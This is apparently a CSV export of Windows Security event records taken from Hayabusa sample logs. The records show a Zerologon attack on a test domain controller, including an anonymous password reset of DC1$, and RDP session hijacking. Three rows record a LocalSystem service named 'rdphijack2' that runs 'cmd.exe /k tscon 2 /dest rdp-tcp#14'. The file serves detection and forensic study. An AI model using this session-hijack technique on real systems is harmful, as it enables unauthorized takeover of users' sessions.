RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
19,12154,2022-02-23 09:44:18.5363834,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51246""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
20,12155,2022-02-23 09:44:18.5404674,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6E54,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6E54""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
21,12156,2022-02-23 09:44:22.4510620,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E701E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E701E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
22,12157,2022-02-23 09:44:22.4511566,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E701E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51247""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
23,12158,2022-02-23 09:44:22.4519429,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,5280,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E701E,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E701E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
24,12159,2022-02-23 09:44:28.5434622,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,636,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E6A5C,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E6A5C""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
25,12160,2022-02-23 09:45:04.8135563,4742,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,A computer account was changed,NT AUTHORITY\ANONYMOUS LOGON,,Target: TEST\DC1$,Changed Attribute SamAccountName: - DisplayName: - UserPrincipalName: - HomeDirectory: - HomePath: - ScriptPath: - ProfilePath: - UserWorkstations: - PasswordLastSet: 2022/02/23 18:45:04 AccountExpires: - PrimaryGroupId: - AllowedToDelegateTo: - OldUacValue: - NewUacValue: - UserAccountControl: - UserParameters: - SidHistory: - LogonHours: - DnsHostName: - ServicePrincipalNames: -,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""ComputerAccountChange"",""#text"":""-""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-7""},{""@Name"":""SubjectUserName"",""#text"":""ANONYMOUS LOGON""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E6""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SamAccountName"",""#text"":""-""},{""@Name"":""DisplayName"",""#text"":""-""},{""@Name"":""UserPrincipalName"",""#text"":""-""},{""@Name"":""HomeDirectory"",""#text"":""-""},{""@Name"":""HomePath"",""#text"":""-""},{""@Name"":""ScriptPath"",""#text"":""-""},{""@Name"":""ProfilePath"",""#text"":""-""},{""@Name"":""UserWorkstations"",""#text"":""-""},{""@Name"":""PasswordLastSet"",""#text"":""2022/02/23 18:45:04""},{""@Name"":""AccountExpires"",""#text"":""-""},{""@Name"":""PrimaryGroupId"",""#text"":""-""},{""@Name"":""AllowedToDelegateTo"",""#text"":""-""},{""@Name"":""OldUacValue"",""#text"":""-""},{""@Name"":""NewUacValue"",""#text"":""-""},{""@Name"":""UserAccountControl"",""#text"":""-""},{""@Name"":""UserParameters"",""#text"":""-""},{""@Name"":""SidHistory"",""#text"":""-""},{""@Name"":""LogonHours"",""#text"":""-""},{""@Name"":""DnsHostName"",""#text"":""-""},{""@Name"":""ServicePrincipalNames"",""#text"":""-""}]}}"
26,12161,2022-02-23 09:45:04.8186901,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
27,12162,2022-02-23 09:45:04.8197798,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
28,12163,2022-02-23 09:45:04.8250484,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
29,12164,2022-02-23 09:45:04.8272233,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2088,dc1.test.local,0,,A Kerberos service ticket was requested,,::1:0,Target: TEST.LOCAL\DC1$@TEST.LOCAL,ServiceName: DC1$,ServiceSid: S-1-5-21-3684832485-3471852018-3987709081-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC1$@TEST.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-3684832485-3471852018-3987709081-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""0325d84c-41fc-7bb0-c7f0-91f3188c30e6""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
30,12165,2022-02-23 09:45:22.4510650,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E8C31,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E8C31""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
31,12166,2022-02-23 09:45:22.4511665,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,4056,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51252""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
32,12167,2022-02-23 09:45:22.4518882,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7E8C31,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7E8C31""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
33,12168,2022-02-23 09:46:22.4513024,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7EF5DD,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
34,12169,2022-02-23 09:46:22.4513778,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,2064,dc1.test.local,0,,Successful logon,-\-," (::1)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""51257""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
35,12170,2022-02-23 09:46:22.4521498,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,3580,dc1.test.local,0,,An account was logged off,,,Target: TEST\DC1$,LogonType 3,LogonId: 0x7EF5DD,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST""},{""@Name"":""TargetLogonId"",""#text"":""0x7EF5DD""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
1,284384,2022-02-08 20:33:10.9182672,4697,LogAlways,Microsoft-Windows-Security-Auditing,Security,596,5504,wef.windomain.local,0,,A service was installed on the system,WINDOMAIN\user,,ServiceName: rdphijack2,ServiceFileName: cmd.exe /k tscon 2 /dest rdp-tcp#14,ServiceType: Win32 Own Process,ServiceStartType: Manual,ServiceAccount: LocalSystem,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2631427795-3543736937-124197156-1112""},{""@Name"":""SubjectUserName"",""#text"":""user""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x1945C67""},{""@Name"":""ServiceName"",""#text"":""rdphijack2""},{""@Name"":""ServiceFileName"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""ServiceType"",""#text"":""0x10""},{""@Name"":""ServiceStartType"",""#text"":""3""},{""@Name"":""ServiceAccount"",""#text"":""LocalSystem""}]}}"
2,284391,2022-02-08 20:33:15.1593875,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\services.exe,PID: 0x24C,Parent PID: 0x1980,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\cmd.exe cmd.exe /k tscon 2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1980""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x24C""},{""@Name"":""CommandLine"",""#text"":""cmd.exe /k tscon 2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\services.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
3,284392,2022-02-08 20:33:15.1663418,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6292,wef.windomain.local,0,,A new process has been created,WINDOMAIN\WEF$,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x1980,Parent PID: 0x1B8C,Mandatory label: SECURITY_MANDATORY_SYSTEM_RID,Target User: -\-,,C:\Windows\System32\tscon.exe tscon  2 /dest rdp-tcp#14,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1563.002_RDP-Hijacking_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WEF$""},{""@Name"":""SubjectDomainName"",""#text"":""WINDOMAIN""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x1B8C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\tscon.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1980""},{""@Name"":""CommandLine"",""#text"":""tscon  2 /dest rdp-tcp#14""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-16384""}]}}"
